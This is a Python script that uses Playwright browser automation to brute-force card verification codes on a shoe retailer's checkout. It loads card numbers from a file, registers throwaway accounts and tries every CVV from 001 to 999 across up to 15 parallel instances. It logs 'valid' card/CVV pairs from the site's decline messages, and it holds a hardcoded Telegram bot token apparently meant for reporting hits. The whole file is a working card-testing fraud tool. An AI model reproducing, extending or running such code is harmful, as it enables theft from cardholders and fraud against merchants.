import os
import time
import re
import random
import string
import platform
import requests
from pathlib import Path
from multiprocessing import Process
from playwright.sync_api import sync_playwright
from colorama import Fore, Style

EMAILS_FILE = "CORREOS.txt"
USED_EMAILS_FILE = "emails_usados.txt"
DATA_FILE = "DATA.txt"
CVV_VALIDOS_FILE = "CVV_VALIDOS.txt"
CVV_INVALIDOS_FILE = "CVV_INVALIDOS.txt"

bot_token = '7909382477:AAFZOzQ1xBFD5JZGzpE3j3_UIjySllklis4'
chat_id = '7163119135'

class Colores:
    ROJO = '\033[91m'
    VERDE = '\033[92m'
    AMARILLO = '\033[93m'
    AZUL = '\033[94m'
    RESET = '\033[0m'


def generar_email():
    dominios = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]
    nombre = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{nombre}@{random.choice(dominios)}"

def get_start_cvv(numero, mes, ano):
    if not os.path.exists(CVV_INVALIDOS_FILE):
        return "001"
    pattern = re.compile(rf"^{re.escape(numero)}\|{mes}\|{ano}\|(\d{{3}})$")
    last = 0
    with open(CVV_INVALIDOS_FILE, "r") as f:
        for line in f:
            m = pattern.match(line.strip())
            if m:
                cvv_int = int(m.group(1))
                if cvv_int > last:
                    last = cvv_int
    siguiente = last + 1
    return str(siguiente).zfill(3) if siguiente <= 999 else None

def get_chrome_path():
    system = platform.system()
    if system == "Windows":
        return "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
    elif system == "Darwin":
        return "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
    elif system == "Linux":
        return "/usr/bin/google-chrome"
    raise RuntimeError("Sistema operativo no compatible")

def remover_tarjeta_de_data(numero, mes, ano):
    if not os.path.exists(DATA_FILE):
        return
    with open(DATA_FILE, "r") as f:
        lineas = f.readlines()
    with open(DATA_FILE, "w") as f:
        for linea in lineas:
            if f"{numero}|{mes}|{ano}" not in linea:
                f.write(linea)

def capturar_mensaje_alerta(page):
    try:
        page.wait_for_selector(".alert", state="visible", timeout=30000)
        page.wait_for_timeout(3000)
        for sel in [".alert-message span", ".alert-message", ".alert"]:
            try:
                texto = page.locator(sel).first.text_content()
                if texto:
                    return texto
            except:
                pass
        if page.get_by_text("CVV2/CID does not match").is_visible():
            return "CVV2/CID does not match"
        if page.get_by_text("Your transaction was declined. Please use an alternative payment method.").is_visible():
            return "transaction declined"
        return "Mensaje de alerta desconocido"
    except:
        return "No se capturó alerta"

def preparar_checkout(page):
    page.goto("https://www.shoedazzle.com/purchase")
    page.get_by_role("button", name="continue checkout").click()
    page.locator('[data-autotag="shipping-firstname"]').fill("hysteria")
    page.locator('[data-autotag="shipping-lastname"]').fill("on the beatt")
    page.locator('[data-autotag="shipping-address"]').fill("street 125")
    page.locator('[data-autotag="shipping-city"]').fill("new york")
    page.locator('#state').fill('new york')
    page.locator('#vs2__listbox').filter(has_text='New York').wait_for(state='visible')
    page.locator('#vs2__listbox').filter(has_text='New York').click()
    page.locator('#zip-code').fill('10023')
    page.locator('#phone-number').fill('3158272814')
    page.locator('button[data-autotag="ship-continue-btn"]').click()
    time.sleep(0.5)
    page.locator('button[data-autotag="address-verification-confirmation-btn"]').click()
    try:
        page.locator("label").filter(has_text="I accept the terms of the").locator("div").first.click()
    except:
        pass

def editar_y_rellenar_pago(page, numero, mes, ano, cvv, nombre_tarjeta="hysteria"):
    try:
        if page.locator('button#edit-payment-information').is_visible():
            page.locator('button#edit-payment-information').click()
            page.locator('input#name').wait_for(state="visible", timeout=5000)
        else:
            page.locator('input#name').wait_for(state="visible", timeout=5000)

        page.locator('input#name').fill(nombre_tarjeta)
        tarjeta_fmt = ' '.join([numero[i:i+4] for i in range(0, len(numero), 4)])
        page.locator('input#number').fill(tarjeta_fmt)
        page.locator('input#expiration').fill(f"{mes}/{ano}")
        time.sleep(2)
        page.locator('input#cvv').fill(cvv)

        if page.locator('button#save-payment-information').is_visible(timeout=3000):
            page.locator('button#save-payment-information').click()
        time.sleep(2)

        if page.locator('button.popup-close-button').is_visible():
            page.locator('button.popup-close-button').click()
            time.sleep(2)

        if page.locator('button[data-autotag="place-order-btn"]').is_visible(timeout=2000):
            page.locator('button[data-autotag="place-order-btn"]').click()

        mensaje = capturar_mensaje_alerta(page)
        evaluar_resultado_cvv(mensaje, numero, mes, ano, cvv, page)

    except Exception as e:
        print(f"Error en editar_y_rellenar_pago: {e}")

def evaluar_resultado_cvv(mensaje, numero, mes, ano, cvv, page):
    if "does not match" in mensaje or page.get_by_text("CVV2/CID does not match").is_visible():
        print(Fore.RED + f"\u2716 {numero}|{mes}|{ano}|{cvv} -> CVV INCORRECTO" + Style.RESET_ALL)
        with open(CVV_INVALIDOS_FILE, "a") as f:
            f.write(f"{numero}|{mes}|{ano}|{cvv}\n")
        siguiente = str(int(cvv) + 1).zfill(3)
        if int(siguiente) <= 999:
            editar_y_rellenar_pago(page, numero, mes, ano, siguiente)
        else:
            print("Todos los CVVs posibles han sido probados sin éxito.")
        return

    if "declined" in mensaje or page.get_by_text("Your transaction was declined. Please use an alternative payment method.").is_visible():
        print(Fore.GREEN + f"\u2611 {numero}|{mes}|{ano}|{cvv} -> CVV CORRECTO" + Style.RESET_ALL)
        # enviar_mensaje(f"{numero}|{mes}|{ano}|{cvv} - CVV CORRECTO")
        with open(CVV_VALIDOS_FILE, "a") as f:
            f.write(f"{numero}|{mes}|{ano}|{cvv}\n")
        remover_tarjeta_de_data(numero, mes, ano)
        print(Fore.YELLOW + f"[{numero}] Instancia detenida tras encontrar CVV válido" + Style.RESET_ALL)
        exit(0)

    if page.get_by_text("verify your payment information").is_visible():
        print("TARJETA BLOQUEADA: DEAD")
        return

    if page.get_by_text("contact your bank to release the hold").is_visible():
        print(f"RESULTADO DUDOSO: CVV CORRECTO (posiblemente bloqueada) : {cvv}")
        with open(CVV_VALIDOS_FILE, "a") as f:
            f.write(f"{numero}|{mes}|{ano}|{cvv}, posiblemente bloqueada\n")
        return

    print(f"CVV ERROR DESCONOCIDO: {cvv}")
    with open(CVV_INVALIDOS_FILE, "a") as f:
        f.write(f"{numero}|{mes}|{ano}|{cvv}\n")

def procesar_tarjeta(tarjeta_linea):
    numero, mes, ano = tarjeta_linea.split("|")
    email = generar_email()
    chrome_path = get_chrome_path()

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False, executable_path=chrome_path)
        context = browser.new_context()
        page = context.new_page()

        try:
            page.goto("https://www.shoedazzle.com/products/Brooks-Western-Boot-HS2500629-9241")
            page.get_by_role("button", name="Close").click()
            page.get_by_role("button", name="VIP Add to Bag").click()
            page.get_by_role("textbox", name="Email*").fill(email)
            page.get_by_role("textbox", name="Password (6 character minimum)*").fill("hysteria100@")
            page.get_by_role("button", name="Continue").click()
            time.sleep(2)
            for _ in range(5):
                page.locator('[data-autotag="pdp_add_to_cart"]').click()
                time.sleep(1)

            preparar_checkout(page)
            start_cvv = get_start_cvv(numero, mes, ano)
            if start_cvv:
                editar_y_rellenar_pago(page, numero, mes, ano, start_cvv)

        except Exception as e:
            print(f"[{numero}] Error: {e}")

        finally:
            context.close()
            browser.close()

def main():
    if not os.path.exists(DATA_FILE):
        print("DATA.txt no existe")
        return

    with open(DATA_FILE, "r") as f:
        tarjetas = [line.strip() for line in f if "|" in line]

    tarjetas_usadas = set()
    procesos_info = []

    for i in range(min(15, len(tarjetas))):
        tarjeta = tarjetas[i]
        tarjetas_usadas.add(tarjeta)
        p = Process(target=procesar_tarjeta, args=(tarjeta,), name=f"Instancia-{i+1}")
        procesos_info.append((p, tarjeta))
        p.start()
        time.sleep(6)

    while True:
        time.sleep(5)

        tarjetas_validadas = set()
        if os.path.exists(CVV_VALIDOS_FILE):
            with open(CVV_VALIDOS_FILE, "r") as f:
                tarjetas_validadas = set(line.strip().split("|")[0] for line in f if "|" in line)

        for i, (p, tarjeta) in enumerate(procesos_info):
            if not p.is_alive():
                numero = tarjeta.split("|")[0]

                if numero in tarjetas_validadas:
                    print(f"[INFO] {p.name} encontró CVV válido. Cargando nueva tarjeta...")

                    nueva_tarjeta = None
                    for t in tarjetas:
                        if t not in tarjetas_usadas:
                            nueva_tarjeta = t
                            break

                    if nueva_tarjeta:
                        tarjetas_usadas.add(nueva_tarjeta)
                        nuevo_p = Process(target=procesar_tarjeta, args=(nueva_tarjeta,), name=p.name)
                        procesos_info[i] = (nuevo_p, nueva_tarjeta)
                        nuevo_p.start()
                        time.sleep(6)
                    else:
                        print(f"[INFO] No quedan más tarjetas disponibles para {p.name}")
                else:
                    print(f"[INFO] {p.name} falló o fue interrumpido. Reintentando misma tarjeta...")
                    nuevo_p = Process(target=procesar_tarjeta, args=(tarjeta,), name=p.name)
                    procesos_info[i] = (nuevo_p, tarjeta)
                    nuevo_p.start()
                    time.sleep(6)

if __name__ == "__main__":
    main()